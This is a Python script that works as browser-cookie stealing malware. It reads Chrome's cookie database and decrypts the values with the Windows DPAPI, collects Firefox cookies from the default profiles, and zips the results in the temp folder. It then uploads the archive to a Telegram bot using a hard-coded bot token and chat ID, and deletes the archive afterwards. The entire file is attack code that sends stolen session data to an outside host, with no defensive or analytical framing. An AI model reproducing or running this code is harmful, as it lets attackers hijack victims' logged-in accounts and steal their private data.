import os
import shutil
import sqlite3
import json
import base64
import zipfile
import requests
import tempfile
from win32crypt import CryptUnprotectData

def get_chrome_cookies():
    cookies = []
    path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
    if os.path.exists(path):
        temp_db = tempfile.mktemp()
        shutil.copyfile(path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        for host, name, encrypted_val in cursor.fetchall():
            decrypted = CryptUnprotectData(encrypted_val)[1]
            cookies.append(f"{host}\tTRUE/\t{name}\t{base64.b64encode(decrypted).decode()}")
        conn.close()
        os.unlink(temp_db)
    return cookies

def get_firefox_cookies():
    cookies = []
    profiles = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
    for profile in os.listdir(profiles):
        if '.default' in profile:
            path = os.path.join(profiles, profile, 'cookies.sqlite')
            if os.path.exists(path):
                temp_db = tempfile.mktemp()
                shutil.copyfile(path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host, name, value FROM moz_cookies")
                for host, name, value in cursor.fetchall():
                    cookies.append(f"{host}\tTRUE/\t{name}\t{value}")
                conn.close()
                os.unlink(temp_db)
    return cookies

def create_archive(cookies):
    temp_dir = tempfile.mkdtemp()
    for i, data in enumerate(cookies):
        with open(os.path.join(temp_dir, f'cookies_{i}.txt'), 'w') as f:
            f.write("\n".join(data))
    zip_path = os.path.join(os.environ['TEMP'], 'cookies_archive.zip')
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        for file in os.listdir(temp_dir):
            zipf.write(os.path.join(temp_dir, file), file)
    shutil.rmtree(temp_dir)
    return zip_path

def send_to_telegram(zip_path, token, chat_id):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    with open(zip_path, 'rb') as f:
        requests.post(url, files={'document': f}, data={'chat_id': chat_id})
    os.unlink(zip_path)

if __name__ == "__main__":
    all_cookies = []
    all_cookies.extend(get_chrome_cookies())
    all_cookies.extend(get_firefox_cookies())
    archive = create_archive(all_cookies)
    BOT_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"
    CHAT_ID = "1962231620"
    send_to_telegram(archive, BOT_TOKEN, CHAT_ID)
